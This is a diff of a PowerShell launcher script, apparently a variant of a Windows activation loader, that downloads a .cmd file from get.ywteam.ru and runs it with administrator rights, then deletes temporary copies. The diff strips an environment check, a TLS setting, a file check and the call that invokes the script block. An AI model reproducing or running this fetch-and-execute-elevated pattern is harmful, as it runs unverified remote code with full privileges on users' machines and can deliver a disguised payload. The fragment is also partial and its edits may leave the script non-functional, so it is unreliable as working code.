@@ -18,18 +18,6 @@ if (-not $args) {
         return
     }
 
-    try {
-        [void][System.AppDomain]::CurrentDomain.GetAssemblies(); [void][System.Math]::Sqrt(144)
-    }
-    catch {
-        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host "Powershell failed to load .NET command."
-        Write-Host "Help - https://gravesoft.dev/in-place_repair_upgrade" -ForegroundColor White -BackgroundColor Blue
-        return
-    }
-
-    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
-
     $URLs = @(
         'https://get.ywteam.ru/ZAI.cmd'
     )
@@ -63,9 +51,8 @@ if (-not $args) {
     else {
         saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" -el $args""" -Wait -Verb RunAs
     }	
-    CheckFile $FilePath
-
     $FilePaths = @("$env:SystemRoot\Temp\ZAI*.cmd", "$env:USERPROFILE\AppData\Local\Temp\ZAI*.cmd")
     foreach ($FilePath in $FilePaths) { Get-Item $FilePath -ErrorAction SilentlyContinue | Remove-Item }
-} @args
+}
+
 </pre></body></html>
